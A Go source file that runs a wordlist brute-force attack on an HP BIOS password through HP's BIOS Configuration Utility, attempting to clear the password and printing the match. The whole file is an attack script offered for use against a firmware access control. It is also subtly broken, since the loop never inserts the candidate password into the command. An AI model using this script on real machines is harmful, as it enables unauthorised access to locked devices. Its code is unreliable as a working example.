// HP BCU versions lower than 3.0.3.1 are required to check plain-text passwords.
//'go run hpbioshock.go' must be run from an elevated command prompt.

package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
)

func main() {
	file, err := os.Open("brutalist.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	bcu := "C:\\PROGRA~2\\Hewlett-Packard\\BIOS Configuration Utility\\BiosConfigUtility64.exe"
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		pass := scanner.Text()
		log.Println("Trying " + pass + "...")
		out, _ := exec.Command(bcu, "cspswd:\"BIOS password\"", "nspswd:\"\"").CombinedOutput()
		res := string(out)
		if !strings.Contains(res, "invalid") {
			fmt.Println(pass)
			fmt.Println(res)
			fmt.Println("*** SUCCESS ***")
			return
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}
